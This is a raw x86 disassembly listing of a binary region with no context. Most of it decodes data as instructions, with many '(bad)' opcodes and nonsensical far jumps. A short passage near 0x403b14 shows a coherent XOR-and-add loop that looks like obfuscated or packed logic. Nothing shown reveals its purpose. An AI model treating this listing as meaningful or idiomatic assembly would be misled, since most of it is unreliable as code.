  403a0a:	int    0x84
  403a0c:	dec    esi
  403a0d:	mov    al,ds:0xb8b09508
  403a12:	pop    ss
  403a13:	lea    edx,[ecx]
  403a15:	xchg   DWORD PTR [esi+0x16d7ca05],ebx
  403a1b:	pop    ss
  403a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a1d:	push   edi
  403a1e:	je     0x403a34
  403a20:	int3   
  403a21:	jnp    0x403a52
  403a23:	aas    
  403a24:	pop    esp
  403a25:	arpl   WORD PTR [eax-0x6d],sp
  403a28:	jl     0x403a9d
  403a2a:	int    0x3a
  403a2c:	pop    ss
  403a2d:	sub    bh,BYTE PTR [ebx+0x5fa774b4]
  403a33:	pop    esp
  403a34:	cmp    al,BYTE PTR [edi]
  403a36:	lahf   
  403a37:	je     0x4039f8
  403a39:	sbb    edi,DWORD PTR [eax]
  403a3b:	add    edi,esi
  403a3d:	aas    
  403a3e:	xchg   esp,eax
  403a3f:	sub    DWORD PTR [esi-0x1d],ecx
  403a42:	sbb    al,0x48
  403a44:	sbb    BYTE PTR [edi+0x31959f51],dh
  403a4a:	xor    al,cl
  403a4c:	and    BYTE PTR [edx-0x62],ch
  403a4f:	or     BYTE PTR [edi-0x78db4a96],dh
  403a55:	outs   dx,BYTE PTR ds:[esi]
  403a56:	into   
  403a57:	or     edx,DWORD PTR [edx-0x7029b135]
  403a5d:	cmp    bl,dh
  403a5f:	xor    cl,dh
  403a61:	add    al,0x28
  403a63:	cwde   
  403a64:	mov    ds:0x678a79fe,eax
  403a69:	mov    ah,0xaa
  403a6b:	add    ch,BYTE PTR [edi-0x2dd52f5e]
  403a71:	dec    esi
  403a72:	cmp    eax,0x7c473a38
  403a77:	push   edx
  403a78:	push   esi
  403a79:	aaa    
  403a7a:	shl    cl,0x4f
  403a7d:	call   0x87d5ed1b
  403a82:	ret    0x666d
  403a85:	fsub   DWORD PTR [ecx+eax*1+0x46]
  403a89:	push   ds
  403a8a:	(bad)  
  403a8b:	xchg   ebx,eax
  403a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a8d:	push   edi
  403a8e:	repz (bad) 
  403a90:	push   ebp
  403a91:	and    cl,ch
  403a93:	imul   eax,DWORD PTR [ecx+0x1c4c1b8a],0x8c707efd
  403a9d:	into   
  403a9e:	sub    DWORD PTR [eax-0x72],0xeeed8df7
  403aa5:	adc    eax,0xd1a44d51
  403aaa:	retf   
  403aab:	icebp  
  403aac:	mov    eax,0x312f136c
  403ab1:	call   0xfcf4:0xab5a4b65
  403ab8:	inc    edx
  403ab9:	xor    esp,ebx
  403abb:	inc    ebx
  403abc:	push   ebp
  403abd:	inc    ebx
  403abe:	mov    ah,0x48
  403ac0:	int    0x84
  403ac2:	out    0xed,eax
  403ac4:	lea    eax,[ebp-0x53]
  403ac7:	mov    ecx,0x3ba1b9e9
  403acc:	call   0x6af2:0xbc3de9d3
  403ad3:	push   0x10409e43
  403ad8:	js     0x403aa3
  403ada:	mov    ecx,0x852e97e4
  403adf:	adc    ah,BYTE PTR [edx]
  403ae1:	jnp    0x403a89
  403ae3:	dec    edi
  403ae4:	gs rcr edi,cl
  403ae7:	sbb    DWORD PTR [ebx+0x5d],eax
  403aea:	sub    DWORD PTR [edi],eax
  403aec:	inc    esp
  403aed:	jmp    0x403afd
  403aef:	xchg   ebp,esi
  403af1:	add    BYTE PTR [edi+edi*1+0x7a],bh
  403af5:	das    
  403af6:	pop    ebp
  403af7:	fadd   st,st(7)
  403af9:	or     ebp,DWORD PTR [edi-0x75c5bccb]
  403aff:	push   ebp
  403b00:	mov    dl,0x32
  403b02:	ret    
  403b03:	add    al,0xe1
  403b05:	xor    esi,0x6283b1dc
  403b0b:	dec    ebx
  403b0c:	xchg   edi,eax
  403b0d:	adc    al,0xfc
  403b0f:	icebp  
  403b10:	es cs jge 0x403ad6
  403b14:	cmp    edx,ecx
  403b16:	mov    ecx,DWORD PTR [ebp-0xc]
  403b19:	mov    DWORD PTR [ebp+0x8],ecx
  403b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  403b1f:	je     0x406073
  403b25:	jmp    0x403b5a
  403b2a:	mov    ecx,DWORD PTR [ebp+0x8]
  403b2d:	mov    edx,DWORD PTR [ebp-0x8]
  403b30:	xor    ecx,eax
  403b32:	xor    edx,eax
  403b34:	sub    ecx,edx
  403b36:	sub    ecx,esi
  403b38:	xor    ecx,eax
  403b3a:	mov    DWORD PTR [ebp+0x8],ecx
  403b3d:	mov    ecx,DWORD PTR [ebp+0x8]
  403b40:	mov    edx,DWORD PTR [ebp+0x8]
  403b43:	xor    ecx,eax
  403b45:	imul   edx,edx,0x5708f5
  403b4b:	add    ecx,esi
  403b4d:	lea    ecx,[ebp+ecx*4-0x64]
  403b51:	mov    edi,DWORD PTR [ecx]
  403b53:	add    edx,edi
  403b55:	mov    DWORD PTR [ecx],edx
  403b57:	mov    ecx,DWORD PTR [ebp+0x8]
  403b5a:	xor    ecx,eax
  403b5c:	add    ecx,esi
  403b5e:	jne    0x403b2a
  403b64:	mov    ecx,DWORD PTR [ebp-0x14]
  403b67:	mov    edx,DWORD PTR [ebp+0x8]
  403b6a:	xor    ecx,eax
  403b6c:	xor    edx,eax
  403b6e:	add    ecx,esi
  403b70:	add    edx,esi
  403b72:	cmp    ecx,edx
  403b74:	jae    0x405f8d
  403b7a:	lea    edx,[ecx-0x3272db]
  403b80:	mov    DWORD PTR [ebp-0x18],edx
  403b83:	mov    edi,DWORD PTR [ebp-0x18]
  403b86:	mov    DWORD PTR [ebp-0x24],0x705fd08
  403b8d:	lea    edx,[ebp-0x24]
  403b90:	mov    DWORD PTR [ebp-0x10],edx
  403b93:	mov    edx,DWORD PTR [ebp-0x10]
  403b96:	add    DWORD PTR [edx],0x705fa08
  403b9c:	mov    ebx,DWORD PTR [ebp-0x10]
  403b9f:	xor    edi,eax
  403ba1:	add    edi,DWORD PTR [ebx]
  403ba3:	lea    edx,[ebp+ecx*4-0x64]
  403ba7:	mov    ebx,DWORD PTR [edx]
  403ba9:	xor    edi,ebx
  403bab:	mov    DWORD PTR [edx],edi
  403bad:	jmp    0x405f30
  403bb2:	pop    esi
  403bb3:	stos   BYTE PTR es:[edi],al
  403bb4:	sbb    DWORD PTR [eax],esp
  403bb6:	gs (bad) 
  403bb8:	push   ebx
  403bb9:	lds    ecx,FWORD PTR fs:[ebp+0x477cf475]
  403bc0:	add    BYTE PTR [esp+ebx*1+0x5f],ch
  403bc4:	bound  esp,QWORD PTR [edx+0x1c]
  403bc7:	pop    edi
  403bc8:	bound  esp,QWORD PTR [edx+0x4e]
  403bcb:	scas   al,BYTE PTR es:[edi]
  403bcc:	out    0x16,al
  403bce:	test   al,0x10
  403bd0:	xor    BYTE PTR [ebp-0xfea0f64],cl
  403bd6:	mov    cl,0x4e
  403bd8:	fwait
  403bd9:	loope  0x403bd2
  403bdb:	outs   dx,BYTE PTR ds:[esi]
  403bdc:	pop    esp
  403bdd:	xchg   edx,eax
  403bde:	dec    ecx
  403bdf:	push   ecx
  403be0:	aaa    
  403be1:	scas   al,BYTE PTR es:[edi]
  403be2:	sahf   
  403be3:	jns    0x403ba7
  403be5:	je     0x403c65
  403be7:	mov    ch,0x4f
  403be9:	cdq    
  403bea:	xor    dh,BYTE PTR [ebp-0x14]
  403bed:	jbe    0x403bc1
  403bef:	(bad)  
  403bf0:	std    
  403bf1:	adc    esi,DWORD PTR [edx]
  403bf3:	(bad)  
  403bf4:	push   ss
  403bf5:	push   ecx
  403bf6:	pop    ds
  403bf7:	(bad)  
  403bf9:	es je  0x403bf2
  403bfc:	jnp    0x403b91
  403bfe:	popa   
  403bff:	ins    BYTE PTR es:[edi],dx
  403c00:	mov    WORD PTR [edx],gs
  403c02:	clc    
  403c03:	fnstenv [ecx-0x3b]
  403c06:	(bad)  
  403c07:	in     eax,dx
  403c08:	push   es
  403c09:	adc    bh,cl
  403c0b:	inc    edi
  403c0c:	adc    BYTE PTR [esp+edx*2+0xd],cl
  403c10:	adc    WORD PTR [ebx+0x379d4525],bx
  403c17:	loope  0x403c09
  403c19:	adc    al,0x15
  403c1b:	imul   edi,DWORD PTR [ebx+edi*1],0x33659245
  403c22:	out    0xc1,al
  403c24:	into   
  403c25:	sub    DWORD PTR [edi-0x6d013341],ebx
  403c2b:	scas   al,BYTE PTR es:[edi]
  403c2c:	cmc    
  403c2d:	enter  0x289a,0xa4
  403c31:	jg     0x403c9e
  403c33:	test   BYTE PTR [ebp-0x127d2004],0xb7
  403c3a:	sar    DWORD PTR [edx-0x54],0x4b
  403c3e:	lods   eax,DWORD PTR ds:[esi]
  403c3f:	(bad)  
  403c40:	repnz sub al,0x27
  403c43:	inc    edx
  403c44:	pop    es
  403c45:	push   esp
  403c46:	and    eax,0x3be6e1ab
  403c4b:	mov    eax,0x4087c115
  403c50:	inc    edi
  403c51:	pop    eax
  403c52:	dec    eax
  403c53:	mov    al,0x30
  403c55:	mov    fs,WORD PTR [ecx]
  403c57:	and    esi,esi
  403c59:	ret    0xcf29
  403c5c:	inc    edx
  403c5d:	test   eax,0xeef4cb7b
  403c62:	jge    0x403c5f
  403c64:	add    eax,0x96d01939
  403c69:	dec    edi
  403c6a:	outs   dx,BYTE PTR ds:[esi]
  403c6b:	mov    esi,0xa934397f
  403c70:	cmp    DWORD PTR [eax-0x42c6577e],ebx
  403c76:	jne    0x403cea
  403c78:	push   ss
  403c79:	es dec eax
  403c7b:	xor    eax,0x3777c90e
  403c80:	dec    ecx
  403c81:	pop    eax
  403c82:	enter  0x493f,0x96
  403c86:	mov    al,ds:0xd1065534
  403c8b:	mov    ss,esi
  403c8d:	jo     0x403cac
  403c8f:	nop
  403c90:	in     eax,0xad
  403c92:	retf   0xf94a
  403c95:	and    DWORD PTR [ebx],0x58
  403c98:	repnz mov eax,?
  403c9b:	mov    dl,0x5c
  403c9d:	inc    ebp
  403c9e:	fistp  WORD PTR [edi+ecx*1]
  403ca1:	rol    ah,1
  403ca3:	je     0x403caa
  403ca5:	dec    edi
  403ca6:	daa    
  403ca7:	inc    edi
  403ca8:	mov    ebp,0xe25fff69
  403cad:	hlt    
  403cae:	lahf   
  403caf:	cdq    
  403cb0:	(bad)  
  403cb1:	push   es
  403cb2:	das    
  403cb3:	push   esp
  403cb4:	xor    ch,BYTE PTR [eax]
  403cb6:	mov    bh,0x66
  403cb8:	(bad)  
  403cb9:	icebp  
  403cba:	je     0x403d14
  403cbc:	and    dl,BYTE PTR [edi-0x3a]
  403cbf:	mov    edi,0x4cf6c562
  403cc4:	cmc    
  403cc5:	mov    ds:0xfaf2499f,al
  403cca:	mov    esp,DWORD PTR [ebx+0xd7a1a35]
  403cd0:	out    0x6a,eax
  403cd2:	fs js  0x403d31
  403cd5:	inc    esp
  403cd6:	aas    
  403cd7:	aam    0xf0
  403cd9:	lock (bad) 
  403cdb:	mov    ds:0x14226595,eax
  403ce0:	mov    bl,0x65
  403ce2:	aam    0xeb
  403ce4:	mov    gs,WORD PTR [ebp+0x32]
  403ce7:	repz mov ds:0xf8676c68,al
  403ced:	push   edi
  403cee:	and    BYTE PTR [ebx+eax*8],al
  403cf1:	neg    BYTE PTR [esi+0x502b57c4]
  403cf7:	les    edx,FWORD PTR [ebx+edi*1+0x2d]
  403cfb:	xchg   ebp,eax
  403cfc:	repnz and BYTE PTR [esi+0x7f65097e],0x38
  403d04:	outs   dx,BYTE PTR ds:[esi]
  403d05:	js     0x403d2a
  403d07:	imul   DWORD PTR [ecx]
  403d09:	jp     0x403cfa
  403d0b:	out    dx,eax
  403d0c:	jge    0x403d09
  403d0e:	or     al,0xcd
  403d10:	push   eax
  403d11:	adc    BYTE PTR [ebp-0x24b10154],cl
  403d17:	icebp  
  403d18:	fnstcw WORD PTR [edi-0x54]
  403d1b:	not    BYTE PTR [ecx+ebp*1]
  403d1e:	sbb    al,0xe3
  403d20:	in     eax,0x3d
  403d22:	pusha  
  403d23:	mov    cl,al
  403d25:	jb     0x403d83
  403d27:	call   0x4f3e:0x31cffd94
  403d2e:	ds es mov ch,0x2c
  403d32:	xchg   esp,eax
  403d33:	add    dh,dh
  403d35:	xchg   DWORD PTR [ecx+esi*4+0x78],ebx
  403d39:	jne    0x403ccd
  403d3b:	jl     0x403d30
  403d3d:	mov    BYTE PTR [esi+ebp*1],ch
  403d40:	shl    DWORD PTR [ebx],0xa2
  403d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d44:	jno    0x403d91
  403d46:	ja     0x403d46
  403d48:	arpl   WORD PTR [ebx+0x59],dx
  403d4b:	cwde   
  403d4c:	or     edi,ebx
  403d4e:	add    dh,BYTE PTR [edx-0x2ea66d02]
  403d54:	dec    ebx
  403d55:	loope  0x403ce9
  403d57:	adc    al,0x3f
  403d59:	cmp    ebx,DWORD PTR [edx+0x581c47f1]
  403d5f:	loop   0x403d11
  403d61:	mov    ebp,0x3972aa5a
  403d66:	jnp    0x403d53
  403d68:	icebp  
  403d69:	(bad)  
  403d6a:	jmp    0xee2758bd
  403d6f:	or     BYTE PTR [eax-0x40ec3b68],ah
  403d75:	mov    BYTE PTR [ebx-0x53],ch
  403d78:	or     DWORD PTR [edi+0x4a],ebx
  403d7b:	clc    
  403d7c:	arpl   ax,cx
  403d7e:	mov    dh,cl
  403d80:	pop    ebp
  403d81:	fwait
  403d82:	fwait
  403d83:	adc    DWORD PTR [edx+0x1bc7e2bf],esi
  403d89:	or     BYTE PTR [esi+0x79bed9d],bl
  403d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d90:	push   es
  403d91:	or     al,0x23
  403d93:	xchg   ebx,esi
  403d95:	test   BYTE PTR [eax+0x63cada11],ch
  403d9b:	test   eax,0xdff80e3a
  403da0:	jns    0x403e14
  403da2:	pop    ebx
  403da3:	mov    edi,0x4840ae10
  403da8:	stos   BYTE PTR es:[edi],al
  403da9:	xchg   edi,eax
  403daa:	pushf  
  403dab:	sbb    ch,BYTE PTR [esi+0x53728d0f]
  403db1:	xchg   esp,eax
  403db2:	cld    
  403db3:	hlt    
  403db4:	ins    DWORD PTR es:[edi],dx
  403db5:	stos   BYTE PTR es:[edi],al
  403db6:	add    al,0xe
  403db8:	xchg   BYTE PTR [eax],bl
  403dba:	in     eax,dx
  403dbb:	in     eax,dx
  403dbc:	and    esp,DWORD PTR ds:0x7e279a9f
  403dc2:	retf   
  403dc3:	xor    eax,eax
  403dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dc6:	int    0x29
  403dc8:	xchg   edi,eax
  403dc9:	sbb    DWORD PTR [ebx],edi
  403dcb:	pop    ebp
  403dcc:	bnd ja 0x403df8
  403dcf:	mov    ebx,0x83697b30
  403dd4:	ret    
  403dd5:	int3   
  403dd6:	enter  0xa515,0x23
  403dda:	sar    dh,0x7d
  403ddd:	arpl   sp,si
  403ddf:	in     al,dx
  403de0:	xor    ebp,DWORD PTR [ebx-0x9dbfed0]
  403de6:	adc    DWORD PTR [ecx+edx*8-0x39],edx
  403dea:	jmp    0xf4d9:0xa69e6f49
  403df1:	aad    0x2d
  403df3:	pop    ss
  403df4:	jl     0x403df0
  403df6:	shr    DWORD PTR [ebp+0x5ccb3b74],0x4d
  403dfd:	sbb    DWORD PTR [esi+0x60],ebp
  403e00:	shr    BYTE PTR [edi+esi*2],cl
  403e03:	push   ebx
  403e04:	imul   eax,eax,0xffffffa9
  403e07:	outs   dx,DWORD PTR ds:[esi]
  403e08:	sbb    eax,0x4d49907f
  403e0d:	dec    edi
  403e0e:	dec    esp
  403e0f:	adc    dl,bl
  403e11:	fcom   DWORD PTR [esi-0x50]
  403e14:	sub    edi,esi
  403e16:	push   eax
  403e17:	cdq    
  403e18:	cs push edi
  403e1a:	popa   
  403e1b:	scas   al,BYTE PTR es:[edi]
  403e1c:	dec    esi
  403e1d:	je     0x403db1
  403e1f:	in     eax,dx
  403e20:	jp     0x403e1f
  403e22:	push   0x3bad8baa
  403e27:	sbb    DWORD PTR [ecx-0x7c26286b],eax
  403e2d:	les    eax,FWORD PTR [eax+0x3f]
  403e30:	mov    edx,0xd65060d6
  403e35:	out    dx,eax
  403e36:	pop    esp
  403e37:	ins    BYTE PTR es:[edi],dx
  403e38:	and    dl,dl
  403e3a:	in     eax,dx
  403e3b:	jmp    0xfa1773e9
  403e40:	aas    
  403e41:	push   0x64
  403e43:	call   0x431f:0x203bd9cc
  403e4a:	daa    
  403e4b:	xchg   esi,eax
  403e4c:	cmp    DWORD PTR [edx+ebp*2+0x5e],esi
  403e50:	lods   al,BYTE PTR ds:[esi]
  403e51:	out    dx,eax
  403e52:	in     eax,0x7c
  403e54:	or     BYTE PTR [esi],al
  403e56:	xlat   BYTE PTR ds:[ebx]
  403e57:	jecxz  0x403ecf
  403e59:	sbb    esp,ebp
  403e5b:	add    eax,eax
  403e5d:	adc    bh,BYTE PTR [eax+0x847005d]
  403e63:	(bad)  
  403e64:	mov    cl,0x27
  403e66:	mov    al,ds:0xd8b7dc51
  403e6b:	xchg   ebp,eax
  403e6c:	jnp    0x403e00
  403e6e:	int3   
  403e6f:	out    dx,al
  403e70:	mov    bh,0x73
  403e72:	inc    edi
  403e73:	push   ebx
  403e74:	daa    
  403e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e76:	push   esp
  403e77:	std    
  403e78:	push   es
  403e79:	lods   eax,DWORD PTR ds:[esi]
  403e7a:	scas   al,BYTE PTR es:[edi]
  403e7b:	xchg   esp,eax
  403e7c:	xchg   esi,eax
  403e7d:	sahf   
  403e7e:	mov    edi,0xe1807a23
  403e83:	jno    0x403e56
  403e85:	loope  0x403eb4
  403e87:	xor    ah,BYTE PTR [ebx+0x7250fbe3]
  403e8d:	repz sbb eax,0xe7eda3d1
  403e93:	pop    esi
  403e94:	sub    bh,BYTE PTR [eax+0x4c]
  403e97:	jne    0x403e7b
  403e99:	mov    cl,0x4f
  403e9b:	in     eax,0x60
  403e9d:	popa   
  403e9e:	mov    edx,0xe06220b6
  403ea3:	nop    DWORD PTR ds:0x3380bdd3
  403eaa:	call   0x1bc767e5
  403eaf:	fdiv   st,st(7)
  403eb1:	iret   
  403eb2:	in     eax,0xcc
  403eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eb5:	xlat   BYTE PTR ds:[ebx]
  403eb6:	and    al,0xbc
  403eb8:	xchg   ebp,eax
  403eb9:	cli    
  403eba:	jne    0x403f30
  403ebc:	jnp    0x403ef3
  403ebe:	push   eax
  403ebf:	xor    eax,0x43407a69
  403ec5:	mov    bh,0x4a
  403ec7:	mov    ebp,DWORD PTR [ecx+edx*4-0x4501836a]
  403ece:	add    edx,ebx
  403ed0:	cwde   
  403ed1:	sti    
  403ed2:	mov    fs,ebp
  403ed4:	inc    eax
  403ed5:	jle    0x403e85
  403ed7:	std    
  403ed8:	inc    esi
  403ed9:	(bad)  
  403eda:	sub    ebp,DWORD PTR ds:0x82ee27ad
  403ee0:	loope  0x403eb0
  403ee2:	jp     0x403f07
  403ee4:	outs   dx,DWORD PTR ds:[esi]
  403ee5:	jnp    0x403f3b
  403ee7:	and    eax,0x719351ce
  403eec:	dec    ecx
  403eed:	mov    bh,0x26
  403eef:	jmp    0x403eca
  403ef1:	adc    eax,esp
  403ef3:	cmp    ebx,edi
  403ef5:	shl    DWORD PTR [eax+edx*4+0xc217caa],1
  403efc:	jmp    0xc1ab:0x6bcf51e6
  403f03:	loop   0x403f11
  403f05:	div    BYTE PTR [eax]
  403f07:	in     eax,dx
  403f08:	sub    DWORD PTR [eax-0x44794cfc],0x5856551c
  403f12:	adc    cl,BYTE PTR [edi]
  403f14:	inc    esi
  403f15:	aaa    
  403f16:	imul   esi,DWORD PTR [ebp+ebx*2-0x259962f6],0xffffffa1
  403f1e:	out    dx,al
  403f1f:	(bad)  
  403f20:	mov    esi,0x14a2edda
  403f25:	add    ecx,DWORD PTR [edx]
  403f27:	iret   
  403f28:	or     BYTE PTR [ebx],ch
  403f2a:	and    ebp,eax
  403f2c:	xlat   BYTE PTR ds:[ebx]
  403f2d:	inc    esi
  403f2e:	retf   
  403f2f:	mov    cl,0xae
  403f31:	add    eax,DWORD PTR [ebp-0xf033f53]
  403f37:	aad    0xa0
  403f39:	pop    es
  403f3a:	shld   DWORD PTR [edi-0x2056ea3],eax,cl
  403f41:	imul   eax,DWORD PTR [ecx+0x53],0xfffffffa
  403f45:	faddp  st(3),st
  403f47:	stos   BYTE PTR es:[edi],al
  403f48:	loopne 0x403f88
  403f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f4b:	dec    esp
  403f4c:	mov    BYTE PTR [ebx],bh
  403f4e:	cmp    cl,0x1
  403f51:	inc    esp
  403f52:	pop    edx
  403f53:	lods   al,BYTE PTR ds:[esi]
  403f54:	ins    BYTE PTR es:[edi],dx
  403f55:	push   eax
  403f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f57:	into   
  403f58:	xor    eax,0xdda72e03
  403f5d:	xchg   DWORD PTR [esi],ecx
  403f5f:	data16 jl 0x403f50
  403f62:	aaa    
  403f63:	xor    DWORD PTR [ebx],edi
  403f65:	ret    0x1a0b
  403f68:	test   eax,0x33d9b83f
  403f6d:	fcom   QWORD PTR ds:0x43d4c437
  403f73:	xlat   BYTE PTR ds:[ebx]
  403f74:	push   eax
  403f75:	mov    ds:0x4432314b,al
  403f7a:	outs   dx,BYTE PTR ds:[esi]
  403f7b:	lods   eax,DWORD PTR ds:[esi]
  403f7c:	or     BYTE PTR [edx],cl
  403f7e:	add    eax,0x917b61bd
  403f83:	dec    esp
  403f84:	scas   eax,DWORD PTR es:[edi]
  403f85:	push   ss
  403f86:	loope  0x403ff7
  403f88:	loopne 0x403f5e
  403f8a:	xchg   esp,eax
  403f8b:	push   cs
  403f8c:	xchg   ebp,eax
  403f8d:	imul   esp,DWORD PTR [ebx+0x591cfdf2],0x900ee817
  403f97:	dec    edi
  403f98:	popf   
  403f99:	pop    es
  403f9a:	inc    ecx
  403f9b:	mov    ecx,0x490b050e
  403fa0:	retf   
  403fa1:	pushf  
  403fa2:	fs jbe 0x403fbf
  403fa5:	sbb    cl,BYTE PTR [eax]
  403fa7:	xchg   edi,eax
  403fa8:	inc    esp
  403fa9:	push   cs
  403faa:	mov    bl,0x74
  403fac:	scas   al,BYTE PTR es:[edi]
  403fad:	imul   edi,DWORD PTR [edx-0x55ca34f2],0xb17b09bb
  403fb7:	mov    ecx,0x1d9428fc
  403fbc:	in     eax,0x2
  403fbe:	arpl   WORD PTR [edi-0x3f8b8429],di
  403fc4:	fbld   TBYTE PTR [ebx]
  403fc6:	scas   eax,DWORD PTR es:[edi]
  403fc7:	call   0xa327:0xe7846229
  403fce:	add    ebx,DWORD PTR [esi-0x4e]
  403fd1:	adc    al,0xe4
  403fd3:	out    dx,eax
  403fd4:	sbb    al,al
  403fd6:	loopne 0x40400e
  403fd8:	lahf   
  403fd9:	aad    0x1f
  403fdb:	ins    DWORD PTR es:[edi],dx
  403fdc:	nop
  403fdd:	int    0xc0
  403fdf:	inc    ebp
  403fe0:	(bad)  
  403fe1:	out    dx,eax
  403fe2:	mov    al,ds:0x3a2012b3
  403fe7:	cmp    edi,DWORD PTR [esi]
  403fe9:	fcmovnb st,st(4)
  403feb:	hlt    
  403fec:	add    BYTE PTR [edi+0x65ff9676],bh
  403ff2:	or     ebx,DWORD PTR [ecx+0x66c06cd4]
  403ff8:	mov    BYTE PTR [eax+eiz*4],bl
  403ffb:	xchg   ebx,eax
  403ffc:	outs   dx,DWORD PTR ds:[esi]
  403ffd:	fs xchg edi,eax
  403fff:	xor    DWORD PTR [esi-0x434fa002],0xeff1e82e
  404009:	xlat   BYTE PTR ds:[ebx]
  40400a:	lods   al,BYTE PTR ds:[esi]
  40400b:	jae    0x40405b
  40400d:	ins    DWORD PTR es:[edi],dx
  40400e:	dec    ebx
  40400f:	stos   DWORD PTR es:[edi],eax
  404010:	pushf  
  404011:	adc    al,0x36
  404013:	jmp    0x404091
  404015:	add    edx,DWORD PTR [esi]
  404017:	push   cs
  404018:	retf   
  404019:	dec    eax
  40401a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40401b:	fcomp  st(2)
  40401d:	xor    eax,0x8becec9
  404022:	(bad)  
  404024:	cmp    edx,DWORD PTR [ebp-0x51]
  404027:	out    0x10,al
  404029:	mov    cl,0xd9
  40402b:	cmp    cl,BYTE PTR [ebx+0x77]
  40402e:	pop    edi
  40402f:	mov    dl,0xbe
  404031:	sub    eax,0xaf6b66e3
  404036:	cmp    DWORD PTR [eax],ebp
  404038:	lahf   
  404039:	xchg   ebx,eax
  40403a:	sub    BYTE PTR [eax],bh
  40403c:	or     esi,esp
  40403e:	test   BYTE PTR [ebx+ecx*2-0x70],al
  404042:	push   ds
  404043:	popa   
  404044:	outs   dx,BYTE PTR ds:[esi]
  404045:	imul   ebp,DWORD PTR [edx+eax*1-0x11],0xde6773e3
  40404d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40404e:	jge    0x404000
  404050:	or     al,0x87
  404052:	out    0x9a,al
  404054:	inc    esp
  404055:	mov    eax,0x2298e661
  40405a:	pusha  
  40405b:	and    ah,0xb3
  40405e:	jg     0x40409c
  404060:	retf   
  404061:	pop    esi
  404062:	mov    edx,esi
  404064:	and    al,0xb6
  404066:	in     al,0xb2
  404068:	dec    eax
  404069:	xchg   edi,eax
  40406a:	je     0x4040a7
  40406c:	and    ch,BYTE PTR [esi]
  40406e:	in     eax,0xbc
  404070:	int3   
  404071:	dec    edx
  404072:	loopne 0x403ffb
  404074:	cli    
  404075:	adc    DWORD PTR [ebp+0x53bcecfb],eax
  40407b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40407c:	out    0x7d,al
  40407e:	ss fs push 0x10ef3b4
  404085:	mov    DWORD PTR cs:[ebp+eax*1+0x33],eax
  40408a:	in     al,dx
  40408b:	xchg   dh,al
  40408d:	push   esi
  40408e:	sub    esp,DWORD PTR [ecx]
  404090:	add    dh,BYTE PTR [ecx+ebx*2+0x207212ee]
  404097:	sbb    edi,edx
  404099:	or     BYTE PTR [edi],cl
  40409b:	push   0xffffffd5
  40409d:	iret   
  40409e:	stc    
  40409f:	mov    ds:0xc3630beb,al
  4040a4:	dec    ebx
  4040a5:	mov    ss,ebp
  4040a7:	xlat   BYTE PTR ds:[ebx]
  4040a8:	test   al,0x33
  4040aa:	hlt    
  4040ab:	sbb    al,0xfb
  4040ad:	cmp    BYTE PTR [eax-0x5130058b],bh
  4040b3:	pop    ss
  4040b4:	cwde   
  4040b5:	or     ecx,eax
  4040b7:	aaa    
  4040b8:	mov    BYTE PTR [ebp-0x6954f31b],cl
  4040be:	retf   0xcde3
  4040c1:	cmp    al,BYTE PTR [ebp+0x34d7925a]
  4040c7:	loope  0x40408b
  4040c9:	push   edx
  4040ca:	inc    ecx
  4040cb:	ficom  DWORD PTR [esi+0x1b]
  4040ce:	fwait
  4040cf:	ret    
  4040d0:	or     eax,0xc4eaeea4
  4040d5:	jae    0x40413b
  4040d7:	data16 jmp 0x404149
  4040da:	jl     0x4040a9
  4040dc:	jmp    0x906c:0xd5c11794
  4040e3:	fs push ss
  4040e5:	jmp    0xd4c6:0xd5ad36ef
  4040ec:	xchg   ecx,eax
  4040ed:	add    ecx,eax
  4040ef:	pop    eax
  4040f0:	inc    esi
  4040f1:	mov    eax,DWORD PTR [ecx]
  4040f3:	scas   eax,DWORD PTR es:[edi]
  4040f4:	ficom  DWORD PTR [esi]
  4040f6:	pop    esp
  4040f7:	ins    BYTE PTR es:[edi],dx
  4040f8:	test   DWORD PTR [ebx+0x7],0x7e4dd12e
  4040ff:	mov    bl,0xfd
  404101:	(bad)  
  404103:	jmp    0x7f1d1c1b
  404108:	out    dx,al
  404109:	ja     0x4040e9
  40410b:	dec    BYTE PTR [esi]
  40410d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40410e:	mov    ah,0xfa
  404110:	inc    esi
  404111:	stos   DWORD PTR es:[edi],eax
  404112:	in     eax,dx
  404113:	cmp    eax,0x31c519da
  404118:	leave  
  404119:	sbb    dl,bl
  40411b:	pop    esp
  40411c:	outs   dx,BYTE PTR ds:[esi]
  40411d:	jg     0x40416e
  40411f:	rcr    bh,1
  404121:	xchg   ecx,eax
  404122:	cld    
  404123:	and    al,0x9f
  404125:	test   eax,0xc5ea47c9
  40412a:	add    DWORD PTR [esi-0x5a7edd20],ebx
  404130:	mov    ch,0x37
  404132:	inc    eax
  404133:	dec    ecx
  404134:	pop    esi
  404136:	ret    0xf323
  404139:	mov    ebp,0x81896399
  40413e:	loopne 0x404152
  404140:	sub    BYTE PTR [ebx],ch
  404142:	inc    eax
  404143:	adc    eax,0xd6c343d4
  404148:	pop    edi
  404149:	add    DWORD PTR [ecx+0x2c],ecx
  40414c:	adc    al,0x8c
  40414e:	jge    0x4041a8
  404150:	sti    
  404151:	daa    
  404152:	mov    al,ds:0xbe7e9be9
  404157:	mov    dl,0x96
  404159:	out    0xed,eax
  40415b:	dec    edi
  40415c:	paddq  mm3,QWORD PTR [ebx]
  40415f:	out    0xa,al
  404161:	push   es
  404162:	and    eax,0xf7416907
  404167:	inc    edi
  404168:	mov    cx,0x2e20
  40416c:	xor    BYTE PTR [ecx],ch
  40416e:	pushf  
  40416f:	dec    ebp
  404170:	dec    esp
  404171:	mov    ch,0x8f
  404173:	dec    edx
  404174:	cmp    BYTE PTR [ebp+0x15],dl
  404177:	cmp    ebp,DWORD PTR [ecx-0x28]
  40417a:	xor    cl,BYTE PTR [edx+0x485eddf3]
  404180:	pop    ebx
  404181:	(bad)  
